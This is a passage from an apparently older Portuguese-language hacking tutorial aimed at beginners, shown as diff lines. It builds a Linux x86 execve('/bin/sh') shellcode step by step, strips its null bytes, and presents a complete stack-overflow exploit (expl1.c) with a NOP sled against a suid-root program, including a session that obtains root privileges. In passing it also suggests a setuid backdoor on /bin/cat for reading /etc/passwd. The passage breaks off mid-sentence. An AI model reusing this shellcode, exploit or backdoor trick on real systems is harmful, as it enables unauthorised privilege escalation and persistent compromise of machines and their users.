+sabermos de onde vem esse 0x0.
+Lembrando que eh para Newbies que escrevo, nao o termo Newbie do
+livro "A Internet e os Hackers", onde a unica coisa que escapa eh a capa,
+tem um bom ditado para isso:"Nao julgue o livro pela capa!", quando falo
+Newbies, sao sim pesquisadores, pessoas com espirito com fome de
+conhecimento, mas que por um motivo ou outro,nao conseguem acesso a material
+de nivel.Manisfestos a parte, vamos continuando nossa jornada.
+
+Sabemos os passos que devemos seguir, entao iremos agora formar esses
+passos  num esquema de codigos asm para facilitar ainda mais nosso
+aprendizado.
+
+O esquema seria mais ou menos o seguinte:
+
+movl endereco_da_string, endereco_do_endereco_da_string
+movb $0x0, endereco_do_byte_nulo
+movl $0x0, endereco_do_nulo
+movl $0xb, %eax
+movl endereco_da_string, %ebx
+leal endereco_da_string, %ecx
+leal string_nula, %edx
+int $0x80
+movl $0x1, %eax
+movl $0x0, %ebx
+int $0x80
+/bin/sh vem aqui.
+
+Podemos visualizar que estamos bem proximo de conseguir efetivar nosso
+shellcode.Mas surge um problema, nos nao sabemos onde no espaco da memoria
+do programa alvo nos iremos exploitar o codigo(e a string que segue ele
+serah colocada.Uma possivel solucao para isso, seria usar as instrucoes
+JMP e CALL para circular nosso codigo.Essas instrucoes podem usar
+enderecamento IP relativo, que despreza que nos podemos saltar para um
+offset do IP atual sem necessitar saber o endereco exato de onde na
+memoria nos queremos saltar.Se colocarmos uma instrucao CALL antes da
+string "/bin/sh" e uma intrucao JMP para ela(instrucao CALL), o
+endereco da string serah empurrado sobre o Stack como o endereco de
+retorno(return address) quando CALL for executado.Exato amigo!!
+Acontecerah exatamente isto que voce estah imaginando.Mas para isso
+precisamos copiar o endereco de retorno sobre um registrador, com isso
+a intrucao CALL pode chamar o inicio de nosso codigo.Veremos agora como
+ficarah nosso esquema em asm:
+
+jmp offset-para-chamar                  # 2 bytes
+popl %esi                               # 1 byte
+movl %esi, array-offset(%esi)           # 3 bytes
+movb $0x0, nullbyte-offset(%esi)        # 4 bytes
+movl $0x0, null-offset(%esi)            # 7 bytes
+movl $0xb, %eax                         # 5 bytes
+movl %esi, %ebx                         # 2 bytes
+leal array-offset(%esi), %ecx           # 3 bytes
+leal null-offset(%esi), %edx            # 3 bytes
+int $0x80                               # 2 bytes
+movl $0x1, %eax                         # 5 bytes
+movl $0x0, %ebx                         # 5 bytes
+int  $0x80                              # 2 bytes
+call offset-para-popl                   # 5 bytes
+/bin/sh vem aqui                        # 5 bytes
+
+Analizando bem o esquema acima, veremos algumas mudancas, nao nos
+conceitos,mas na sintaxe asm propriamente dita, explico tudo isso no
+txt sobre shellcodes,mas abaixo segue uma explicacao simples sobre o
+esquema acima:
+
+jmp offset-para-chamar                  # 3 bytes
+popl %esi                               # 1 byte
+
+Essas duas novas linhas sao responsaveis pela mudanca.jmp, como dito
+era saltar para o endereco, nesse caso offset, declarado em
+offset-para-chamar. Esse offset eh o endereco de call, apos isso, call
+chamarah popl %esi.Continuando:
+
+movl %esi, array-offset(%esi)           # 3 bytes
+movb $0x0, nullbyte-offset(%esi)        # 4 bytes
+movl $0x0, null-offset(%esi)            # 7 bytes
+movl $0xb, %eax                         # 5 bytes
+movl %esi, %ebx                         # 2 bytes
+leal array-offset(%esi), %ecx           # 3 bytes
+leal null-offset(%esi), %edx            # 3 bytes
+int $0x80                               # 2 bytes
+
+Acima segue os nossos passos de 1 a 7, referentes aos codigos de execve().
+Continuando:
+
+movl $0x1, %eax                         # 5 bytes
+movl $0x0, %ebx                         # 5 bytes
+int  $0x80                              # 2 bytes
+
+Acima estao os codigos referentes a funcao exit(), descritos nos nossos
+passos de 8 a 10.Continuando:
+
+call offset-para-popl                   # 5 bytes
+/bin/sh vem aqui                        # 8 bytes
+
+Aih em cima podemos ver a instrucao call, responsavel por fazer o giro
+ou circulo.Essa instrucao chama a intrucao popl lah em cima.Voce pode
+estar se perguntando se esse giro nao seria um loop infinito.Na verdade
+isso nao acontece, lembrando, estamos trabalhando com assembly, como
+estamos manipulando enderecos de memoria, o endereco correspondente a
+instrucao call que eh saltada usando jmp no inicio, nao serah mais
+chamado, logo nao existe um loop infinito.Acho que as coisas sao mais
+claras para o pessoal que meche bem com "goto". :)
+
+O grafico abaixo pode ajudar voce a compreender melhor tudo o que estah
+acontecendo aqui:
+
+
+Parte inferior                                    Topo da Memoria
+da memoria
+
+          buffer         sfp   ret      a       b        c
+
+<---- [JJSSSSSSSSCCss] [ssss] [0xD8]  [0x01]  [0x02]  [0x03]
+       ^|^       ^|              |
+       |||_______||______________|
+        ||_______||
+         |________|
+        
+
+Topo do Stack                                     Parte inferior do Stack
+
+Onde:
+
+J -> Refere a intrucao JMP.
+C -> Refere a instrucao CALL.
+S -> Codigo asm que queremos executar.
+s -> Codigo da string que queremos executar ("/bin/sh").
+
+buffer -> Nosso buffer vulneravel a overflow.
+sfp -> O frame pointer.
+ret -> Endereco de retorno.
+
+A seta indica para onde estah saltando a instrucao.
+
+Espero que tudo tenha clareado mais para voce.Em cima disso, podemos
+calcular os offsets necessarios para jmp saltar para call, de call
+para popl, do endereco da string para o array, e do endereco da
+string p/ a word null long.
+Caso alguem possua duvidas de como se descobrir os offsets, lembro
+novamente, eh bom aprender assembly!!Mas eu coloquei um esquema bem
+detalhado no txt sobre shellcodes.Se quiser ou precisar, de uma olhada
+nele.
+
+Seguindo em frente, veremos como nosso codigo ficarah inserindo-o em
+um programa C. Somente observe, nao compile ainda.
+
+#include<stdio.h>
+#include <stdlib.h>
+void main() {
+__asm__("
+        jmp    0x2a                     # 3 bytes
+        popl   %esi                     # 1 byte
+        movl   %esi,0x8(%esi)           # 3 bytes
+        movb   $0x0,0x7(%esi)           # 4 bytes
+        movl   $0x0,0xc(%esi)           # 7 bytes
+        movl   $0xb,%eax                # 5 bytes
+        movl   %esi,%ebx                # 2 bytes
+        leal   0x8(%esi),%ecx           # 3 bytes
+        leal   0xc(%esi),%edx           # 3 bytes
+        int    $0x80                    # 2 bytes
+        movl   $0x1, %eax               # 5 bytes
+        int    $0x80                    # 2 bytes
+        call   -0x2f                    # 5 bytes
+        .string \"/bin/sh\"             # 8 bytes
+");
+}
+
+Existe um probleminha amigo, para que o nosso codigo funcione,
+necessitamos declarar ele como uma variavel global, para podermos colocar
+nosso codigo no Stack ou Segmento Data(onde teremos permissao de escrita)
+,transferindo o controle para ele,pois nosso codigo modifica ele mesmo
+e muitos sistemas operacionais marcam paginas de codigos read-only(soh
+leitura).Para fazermos isso, necessitamos da representacao hexadecimal
+do codigo binario.Vejamos abaixo como fazer isso tudo:
+
+* Primeiro compilamos o nosso programa acima, usando a seguinte sintaxe
+  na linha de comando:
+
+[localhost:/]$gcc -o shell -g -ggdb shell.c
+
+* Em seguida executamos o debugador.
+
+[localhost:/]$ gdb shell
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details. This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)
+
+* Agora vem a parte que se exige mais paciencia do fucador.Muita gente
+  acha um saco ter que fazer isso, mas nao tem outro jeito,paciencia
+  amigo.O esquema eh que o debugador nos dirah o codigo hexadecimal
+  correspondente a cada uma da linha de comando.Para fazer isso voce
+  digita o seguinte:
+
+(gdb)disassemble main
+Dump of assembler code for function main:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     jmp    0x804817f <main+47>
+0x8048155 <main+5>:     pop    %esi
+0x8048156 <main+6>:     mov    %esi,0x8(%esi)
+0x8048159 <main+9>:     movb   $0x0,0x7(%esi)
+0x804815d <main+13>:    movl   $0x0,0xc(%esi)
+0x8048164 <main+20>:    mov    $0xb,%eax
+0x8048169 <main+25>:    mov    %esi,%ebx
+0x804816b <main+27>:    lea    0x8(%esi),%ecx
+0x804816e <main+30>:    lea    0xc(%esi),%edx
+0x8048171 <main+33>:    int    $0x80
+0x8048173 <main+35>:    mov    $0x1,%eax
+0x8048178 <main+40>:    int    $0x80
+0x804817a <main+42>:    call   0x8048150 <main>
+0x804817f <main+47>:    das
+0x8048180 <main+48>:    bound  %ebp,0x6e(%ecx)
+0x8048183 <main+51>:    das
+0x8048184 <main+52>:    jae    0x80481ee <__new_exitfn+54>
+0x8048186 <main+54>:    add    %cl,0x90c35dec(%ecx)
+End of assembler dump.
+
+Isso voce jah sabe o que faz(mostra codigo asm do nosso programa),agora
+amigo para saber o codigo hexadecimal de cada um desses comandos, voce
+terah que digitar o seguinte " x/xb <indice>" como no esquema abaixo:
+
+(gdb) x/xb main+3
+0x8048153 <main+3>:     0xeb
+(gdb) x/xb main+4
+0x8048154 <main+4>:     0x2a
+(gdb) x/xb main+5
+0x8048155 <main+5>:     0x5e
+(gdb) x/xb main+6
+0x8048156 <main+6>:     0x89
+.
+.
+.
+(gdb) x/xb main+56
+0x8048188 <main+56>:    0xec
+(gdb) x/xb main+57
+0x8048189 <main+57>:    0x5d
+(gdb) x/xb main+58
+0x804818a <main+58>:    0xc3
+(gdb) x/xb main+59
+0x804818b <main+59>:    0x90
+
+Voce comecarah com o indice "main+3" e irah ateh quando chegar o
+hexadecimal "0x90" que corresponde a instrucao NOP, que serah vista logo
+abaixo (essa linha nao deve entrar no nosso shell code).Caso em outro
+shellcode feito por voce, isso nao apareca, coloque os hexadecimais ateh
+a ultima instrucao da funcao main().
+
+Feito tudo isso, voce colocarah todos as linhas do programa em hexa, numa
+variavel global, como no esquema abaixo:
+
+/* Exemplo inicial de shellcode
+   Compile com: $gcc -o shell1 shell1.c
+
+ */
+
+#include <stdio.h>
+
+char shellcode[] =
+        "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+        "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+        "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
+
+void main() {
+   int *retorno;
+  retorno = (int *)&retorno + 2;
+   (*retorno) = (int)shellcode;
+
+}
+
+Depois de compilado voce pode executar ele normalmente, como no exemplo
+abaixo:
+
+[localhost:/]$ gcc -o shell1 shell1.c
+[localhost:/]$./shell1
+bash$ exit
+exit
+
+Como voce pode ver, ele funciona!Mas existe um pequeno probleminha,como
+nos estamos querendo executar nosso shellcode atraves de um buffer
+overflow,enchendo-o de caracteres, logo, um byte nulo em nosso shellcode
+irah ser considerado como o fim da string, e consequentemente serah o
+fim frustado de nosso objetivo.Entao necessitados retirar todos os bytes
+nulos(null bytes) de nosso shellcode para que nosso futuro exploit
+nao tenha problemas em executar seu alvo.Para fazermos isso, necessitamos
+conhecer um basico de assembly, mas vejamos como ficaria para nosso
+exemplo:
+
+Instrucao com null byte                       Trocar por:
+------------------------------------------------------------------------
+movb $0x0,0x7(%esi)                         xorl %eax,%eax
+                                            movb %eax,0x7(%esi)
+movl $0x0,0xc(%esi)                         movl %eax,0xc(%esi)
+-------------------------------------------------------------------------
+movl $0xb,%eax                              movb $0xb,%al
+-------------------------------------------------------------------------
+movl $0x1,%eax                              xorl %ebx,%ebx
+movl $0x0,%ebx                              movl %ebx,%eax
+                                            inc  %eax
+-------------------------------------------------------------------------
+        
+Como podemos ver, nao ha muita coisa para fazermos no intuito de retirar
+os null bytes.Veremos entao como fica o nosso codigo apos a substituicao
+dos mesmos:
+
+/* Shellcode com sobstituicao dos null bytes */
+
+#include <stdio.h>
+
+main(){
+__asm__("
+jmp 0x1f                                #2 bytes
+popl %esi                               #1 byte
+movl %esi,0x8(%esi)                     #3 bytes
+xorl %eax,%eax                          #2 bytes
+movb %eax,0x7(%esi)                     #3 bytes
+movl %eax,0xc(%esi)                     #3 bytes
+movb $0xb,%al                           #2 bytes
+movl %esi,%ebx                          #2 bytes
+leal 0x8(%esi),%ecx                     #3 bytes
+leal 0xc(%esi),%edx                     #3 bytes
+int $0x80                               #2 bytes
+xorl %ebx,%ebx                          #2 bytes
+movl %ebx,%eax                          #2 bytes
+inc %eax                                #1 byte
+int $0x80                               #2 bytes
+call -0x24                              #5 bytes
+.string \"/bin/sh\"                     #8 bytes
+");
+}
+
+Compilamos entao usando a seguinte sintaxe:
+[localhost:/]$gcc -ggdb -static -o shellnova1 shellnova1.c
+
+Em seguinte usamos o debugador p/ novamente pegarmos o codigo em hexa:
+[localhost:/]$gdb shellnova1
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)disassemble main
+Dump of assembler code for function main:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     jmp    0x8048174 <main+36>
+0x8048155 <main+5>:     pop    %esi
+0x8048156 <main+6>:     mov    %esi,0x8(%esi)
+0x8048159 <main+9>:     xor    %eax,%eax
+0x804815b <main+11>:    mov    %al,0x7(%esi)
+0x804815e <main+14>:    mov    %eax,0xc(%esi)
+0x8048161 <main+17>:    mov    $0xb,%al
+0x8048163 <main+19>:    mov    %esi,%ebx
+0x8048165 <main+21>:    lea    0x8(%esi),%ecx
+0x8048168 <main+24>:    lea    0xc(%esi),%edx
+0x804816b <main+27>:    int    $0x80
+0x804816d <main+29>:    xor    %ebx,%ebx
+0x804816f <main+31>:    mov    %ebx,%eax
+0x8048171 <main+33>:    inc    %eax
+0x8048172 <main+34>:    int    $0x80
+0x8048174 <main+36>:    call   0x8048155 <main+5>
+0x8048179 <main+41>:    das
+0x804817a <main+42>:    bound  %ebp,0x6e(%ecx)
+0x804817d <main+45>:    das
+0x804817e <main+46>:    jae    0x80481e8 <__new_exitfn+52>
+0x8048180 <main+48>:    add    %cl,0x90c35dec(%ecx)
+End of assembler dump.
+(gdb) x/xb main+3
+0x8048153 <main+3>:     0xeb
+(gdb) x/xb main+4
+0x8048154 <main+4>:     0x1f
+(gdb) x/xb main+5
+0x8048155 <main+5>:     0x5e
+(gdb) x/xb main+6
+0x8048156 <main+6>:     0x89
+(gdb) x/xb main+7
+0x8048157 <main+7>:     0x76
+(gdb) x/xb main+8
+0x8048158 <main+8>:     0x08
+(gdb) x/xb main+9
+0x8048159 <main+9>:     0x31
+.
+.
+.
+0x8048178 <main+40>:    0xff
+
+Podemos perfeitamente para por aqui e no nosso shellcode no codigo-fonte
+acrescentarmos a string /bin/sh que se refere ao que queremos executar.
+Fazendo isso teriamos o seguinte shellcode:
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+Mas se nos quisermos substituir a string /bin/sh por seu correspondente
+em hexadecimal, nos devemos continuar pegando os respectivos codigos hexa
+pelo debugador, ateh encontrarmos uma intrucao nop que corresponderah ao
+fim da funcao main().Vejamos:
+
+Haviamos parado em <main + 40>
+Continuando:
+
+(gdb) x/xb main+41
+0x8048179 <main+41>:    0x2f
+(gdb) x/xb main+42
+0x804817a <main+42>:    0x62
+(gdb) x/xb main+43
+0x804817b <main+43>:    0x69
+(gdb) x/xb main+44
+0x804817c <main+44>:    0x6e
+(gdb) x/xb main+45
+0x804817d <main+45>:    0x2f
+.
+.
+.
+0x8048183 <main+51>:    0x5d
+(gdb) x/xb main+52
+0x8048184 <main+52>:    0xc3
+(gdb) x/xb main+53
+0x8048185 <main+53>:    0x90
+(gdb) x/xb main+54
+0x8048186 <main+54>:    0x90
+
+Como podemos ver chagamos ateh a instrucao NOP(0x90), logo nao incluiremos
+ela em nosso shellcode, devemos entao acrescentar ateh <main+52>, fazendo
+entao nosso shellcode ficar assim:
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
+  "\x5d\xc3";
+
+
+Antes de testarmos esse dito cujo, vou dar uma breve explicacao do que
+eh este NOP(0x90) e porque usaremos ele em nossos codigos de exploits
+futuros.A instrucao NOP pode ser considerada como uma instrucao vazia,
+ou uma operacao nula.Quase todos os processadores possuem esta intrucao
+e no nosso caso, um sistema linux i386 o hexadecimal correspondente a
+esta instrucao eh 0x90.Quando executamos um exploit, necessitamos
+fazer com que o endereco de retorno execute nosso shellcode, mas quando
+ele aponta p/ um endereco com dados diferentes do que de fato queremos,
+que eh o inicio do nosso shellcode, ocorre uma Segmentation Violation!
+Ou simplesmente uma violacao de segmentacao, e quando isto ocorre, nos
+nao alcancaremos facilmente nosso objeto.A nao ser que chutemos offsets
+ateh conseguir achar nosso codigo.Mas isto eh muito trabalhoso, de modo
+que eh mais eficiente enchermos o buffer com nosso shellcode no meio
+e o resto de NOP's, isto farah com que, se o retorno apontar para uma
+intrucao NOP no buffer, irah percorrer elas ateh chegar ao inicio de
+nosso shellcode, e ,consequentemente, executar nosso codigo(shellcode).
+Quando chegar a parte sobre escrita de exploits, voce entenderah na
+pratica o que significa isso.
+
+
+Podemos agora testar cada um desses dois shellcodes.Voce pode escolher
+entre qualquer um dos dois, como aqui nos estamos vendo o basico do
+basico, dependendo das situacoes, um shellcode poderah ser melhor que
+o outro(Questao de filtros e etc..).Bem, mas para nossos propositos
+iremos testar nosso shellcode usando o segundo esquema, onde a string
+/bin/sh aparece em formato hexadecimal.Vejamos como fica:
+
+/* Simples Exemplo de Shellcode com string /bin/sh em hexa
+   Compile com: $gcc -o shellnova2 shellnova2.c */
+
+#include <stdlib.h>
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
+  "\x5d\xc3";
+
+void main(){
+int *retorno;
+retorno = (int *)&retorno + 2;
+(*retorno) = (int)shellcode;
+}
+
+O esquema na linha de comando seria:
+[localhost:/]$ gcc -o shellnova2 shellnova2.c
+[localhost:/]$ ./shellnova2
+bash$ exit
+exit
+
+Como podemos ver perfeitamente, ele funciona bem como queriamos.
+
+Bem amigo, espero que voce tenha aprendido com esse texto, a escrita
+basica de shellcodes, isso para a maioria das situacao eh mais do que
+o necessario.Se nao deu para pegar bem, de uma olhada no outro texto que
+fiz somente sobre esse assunto ou mesmo nas home pages que cito no final,
+pode-se dizer que foi nestes textos que aprendi a fazer isso.Lembrando
+o que disse no texto sobre programacao em sockets, que espero que tenha
+lido..:).."SABENDO FAZER UM, O QUE TE IMPEDE DE FAZER TODOS??".
+
+------------------------------
+4 - FAZENDO UM STACK OVERFLOW |
+------------------------------
+
+Bem amigo, chegamos a tao esperada hora! Muitos administradores de rede
+tremem ao ouvir essa palavra, pois sabem o que eh possivel se fazer com
+isso.A escrita de exploits, varia muito, digo isso porque eh muito facil
+exploitar um determinado bug ou um erro de uma funcao que recebe dados
+da linha de comando, mas eh bem dificil as vezes quando a situacao nao
+eh essa(quando a funcao nao recebe dados da linha de comando).O que
+escreverei aqui irah interessar duas classe de programadores de exploits
+( ou serah hackers??:) ), de qualquer forma, a maioria se limita a
+escrever exploits que se utilizam de bugs na linha de comando, mas poucos
+se atentam aos outros tipos.Eh muito comum dizermos da seguranca:"Eles
+sabem o que eh, mas nao sabem fazer!!" justamente porque eles se limitam
+muito a overflows pela linha de comando e afins.
+Mas deixando o papo de lado, vamos comecar do basico, escrevendo um
+exploit para o nosso primeiro programa bugado(aquele lah do inicio).
+
+Lah no inicio, eu coloquei um programa especifico que enche o buffer
+de nosso programa bugado com caracteres A, se recorda? Agora, ao inves
+de enchermos o buffer com caracters 'A' que soh poderiam nos dar,quando
+muito, um Denial Of Service, encheremos o buffer com nosso codigo, e
+sobrescreveremos o return address(endereco de retorno) para que ele
+aponte para o inicio do buffer e consequentemente para o nosso codigo.
+
+Vejamos um esquema antes de fazermos isso:
+
+* Primeiro debugaremos nosso programa bugado usando o gdb.
+
+[localhost:/]$ gdb bug1
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.This GDB was configured as "i686-pc-linux-gnulibc1"...
+(no debugging symbols found)...
+(gdb)
+
++ Em seguida executamos ele para gerar o buffer overflow.
+
+(gdb) run `perl -e 'printf "A" x 530'`
+Starting program: /tmp/bug1 `perl -e 'printf "A" x 530'`
+Voce digitou
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAA!!
+(no debugging symbols found)...
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+
+Prestando atencao, podemos perfeitamente ver que geramos o overflow:
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+Esse 0x41 se refere aos 'A's, ele eh o numero hexa correspondente ao
+caracter A.Fizemos isso mais para demonstrar que o programa possui um
+bug e que voce pode perfeitamente descobrir usando o programa gdb.
+
+Agora vem a parte mais seria, vamos pedir ao gdb para nos mostrar aonde
+na memoria(em hexa) estah o nosso Stack Pointer atual.Para isso usamos
+o seguinte comando:
+
+(gdb) info all-registers
+eax            0x0      0
+ecx            0x80485bf        134514111
+edx            0x3      3
+ebx            0x0      0
+esp            0xbffff838       0xbffff838
+ebp            0x41414141       0x41414141
+esi            0x40006394       1073767316
+edi            0x8048400        134513664
+eip            0x41414141       0x41414141
+eflags         0x10246  66118
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb)
+
+ou se preferir:
+
+(gdb) info register eip
+eip            0x41414141       0x41414141
+(gdb) info register esp
+esp            0xbffff838       0xbffff838
+(gdb)
+
+
+Como voce pode ver, ele mostra todos os registradores, mas no momento,
+devemos nos concentrar somente em dois.O registar eip(index pointer)
+que eh aonde se localiza nossos 'A's, e o registrador esp(Stack pointer)
+No caso acima teremos:
+
+(gdb) info register eip
+eip            0x41414141       0x41414141
+
+para eip (Index pointer).
+
+
+(gdb) info register esp
+esp            0xbffff838       0xbffff838
+
+para esp (Stack pointer).
+
+Bem amigo, para que tudo isso? Iremos inicialmente criar um exploit em
+cima desse esp.Eu digo desse, porque ele varia, e como estamos executando
+gdb, partimos do pre-suposto que vamos fazer um exploit p/ maquina local,
+onde poderemos compilar nosso exploit.P/ maquinas remotas o esquema eh
+diferente, pois nao teriamos permissao para usar gdb, e outra coisa, mais
+embaixo veremos um metodo mais eficiente do que este, mas por enquanto,
+vamos nos concentrar neste.
+
+Bem, apos pegarmos esse endereco de esp, iremos agora montar a nosso
+primeiro exploit para nosso primeiro programa bugado, o do comeco desse
+txt(bug1).
+
+
+--------------------------- expl1.c ----------------------------------
+/* Primeiro exploit para Programa bugado 1(bug1)
+   Compile com: $ gcc -o expl1 expl1.c */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* Aqui nos definimos a instrucao NOP (explicada no final da parte
+   sobre shellcodes) como sendo seu codigo em hexadecimal */
+
+#define NOP     0x90
+
+/* Sabemos (Sem necessitar ver o codigo-fonte) que o programa bugado
+   eh detonado quando usamos mais de 512 bytes(como vimos usando perl
+   ou mesmo o programa que coloquei no inicio). Entao usaremos nesse
+   exemplo um buffer um pouco maior, recomenda-se nessa faixa(100 a +)
+   para inserir nossos dados */
+
+#define TAMANHO     612
+
+/* Aqui eh o endereco de esp ou Stack pointer, que acabamos de pegar
+   usando gdb acima */
+
+#define RET     0xbffff808
+
+/* Abaixo segue o nosso shellcode */
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
+  "\x5d\xc3";
+
+int main(int argc, char *argv[])
+{
+char buffer[TAMANHO];
+long ret = RET;
+int i, offset = 0;
+long retaddr;
+
+if(argc > 1) offset = atoi(argv[1]);
+
+retaddr = ret + offset;
+
+/* Enchemos retaddr com endereco de buffer */
+
+for (i=0;i<TAMANHO;i+=4)
+   *(long *)&buffer[i] = retaddr;
+
+/* Aqui nos enchemos o buffer de NOP's */
+
+for (i=0;i<(TAMANHO-strlen(shellcode));i++)
+   *(buffer+i) = NOP;
+
+/* Copiamos o shellcode para dentro do buffer */
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* Abaixo nos executamos o comando bugado com argumento em buffer */
+
+execl("./bug1","bug1",buffer,0);
+}
+
+--------------------------------------------------------------------
+
+Compilamos ele em seguida, normalmente:
+
+[localhost:/]$ gcc -o expl1 expl1.c
+[localhost:/]$
+
+Antes de excutar, certifique-se que o programa bugado estah como suid
+root, para ficar bem claro aos nossos propositos.
+
+[localhost:/]$ ls -l bug1
+-rwsr-sr-x   1 0        root         4202 Mar  7 04:02 bug1*
+
+Como podemos ver no meu exemplo, ele se encontra, se aih nao tiver, como
+root voce digita: $ chmod +s bug1
+
+Para nao perder viagem, o que este comando faz eh mudar o modo de um
+arquivo, o parametro +s torna o arquivo suid, ou sid, quem executar ele
+estarah executando como o dono do programa, no nosso caso root.Vai um
+toque, isso pode perfeitamente ser usado como backdoor, um exemplo
+simples seria digitar como root: $ chmod +s /bin/cat ; depois execute cat
+/etc/passwd como um usuario qualquer(nao-root).
+
+Sim, isso nao eh um tutorial sobre backdoor!!:)..continuando com nosso
+exemplo!!Sem mais suspenses, seguimos os passos abaixo!
+
+[localhost:/]$ ls -l bug1
+-rwsr-sr-x   1 0        root         4202 Mar  7 04:02 bug1*
+[localhost:/]$ id
+uid=1000 gid=100(users) groups=100(users)
+
+Agora comecamos a execucao de nosso exploit, caso ele nao consiga seu
+objetivo, chutamos offsets de 50 em 50.
+
+[localhost:/]./expl1
+Pulando para 0xbffff800
+Voce digitouXXXXXX
+XX...
+[localhost:/]# ./expl1 50
+....
+Ilegal Instruction
+[localhost:/]$ ./expl1 100
+...
+Segmentation fault
+[localhost:/]$ ./expl1 150
+...
+Segmentation fault
+[localhost:/]$ ./expl1 200
+...
+Segmentation fault
+[localhost:/]$ ./expl1 250
+...
+Segmentation fault
+[localhost:/]$ ./expl1 300
+bash#id
+uid=1000 gid=100(users) groups=100(users) euid=0(root) egid=0(root)
+
+
+YES!!:)...Como podemos ver perfeitamente, o exploit funciona!
+Aqui foi necessario somente sete tentativas, eh considerado pouco, tem
+exploits que precisamos chutar de -5000 a 5000 de 10 em 10, por isso
+se faz necessario um bom aprendizado disso tudo, logo abaixo voce verah
+um exploit bem melhor para esse mesmo programa bugado.
+Se voce nao conseguiu, continue chutando, certefique-se se colocou o
+esp(Stack Pointer) corretamente.
+Se voce conseguiu, chute outros offsets, verah que ateh mesmo com
+offset = 260 ele pode conseguir root, e tambem com 500, 600. mas se
+colocar um offset grande demais ele nao funciona.
+
+Por isso, esse esquema de exploitar trabalhando em cima do Stack Pointer
+dado pelo programa bugado via gdb nao eh muito confiavel, e como varia
+de maquina para maquina, esse esquema fica limitado a exploitacao local
+com direito a compilacao de programas e uso de gdb.E se nao tiver gdb
+na rede onde voce quer exploitar localmente?? E se nao deixarem voce
+compilar um programa lah? Nao te derem acesso as libs ou nao tiver
+compilador? E se o buffer que voce quer exploitar for muito pequeno?
+
+Bem amigo, demonstrarei solucao para estes e outros problemas no
+proximo capitulo.Mas antes gostaria de dar um conselho de amigo.
+
+Saber escrever um exploit, como podemos ver, eh facil! Saber encontrar
+um bug, tambem eh facil!!Fazer o exploit funcionar nao eh dificil!!
+Essas afirmacoes acima, dependem de cada situacao.O que estou expondo
+nesse arquivo texto, eh de conhecimento publico, meio mundo sabe o que
